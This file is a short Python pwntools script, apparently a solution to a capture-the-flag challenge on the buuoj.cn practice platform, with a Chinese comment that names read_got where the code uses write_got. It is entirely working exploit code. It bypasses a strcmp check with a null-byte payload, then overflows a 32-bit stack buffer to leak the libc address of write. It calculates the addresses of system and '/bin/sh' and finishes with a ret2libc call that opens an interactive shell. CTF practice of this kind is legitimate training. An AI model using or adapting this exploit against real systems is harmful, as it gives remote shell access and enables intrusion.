from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn",25172)
context.log_level = "debug"
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")

#libc_base 
main_addr = 0x8048825
write_plt = elf.plt["write"]
write_got = elf.got["write"]

#1.strcmp v1 = 0
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

#2.Get write address
payload = b'a' * (0xe7+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #main_addr作为返回地址，构造write（1,read_got,4）
p.sendline(payload)
write_addr = u32(p.recv(4))
print("*****write: ",hex(write_addr))

libc_base = write_addr - libc.symbols["write"]
sys_addr = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
print("*****libc_base: ",hex(libc_base))
print("*****sys_addr: ",hex(sys_addr))
print("*****bin_sh: ",hex(bin_sh))

#3.get shell
payload = b'\x00' + b'\xff' * 7
p.sendline(payload)
p.recvuntil('Correct\n')

payload = b'a' * (0xe7+0x4)  + p32(sys_addr) + p32(1) + p32(bin_sh)
p.sendline(payload)

p.interactive()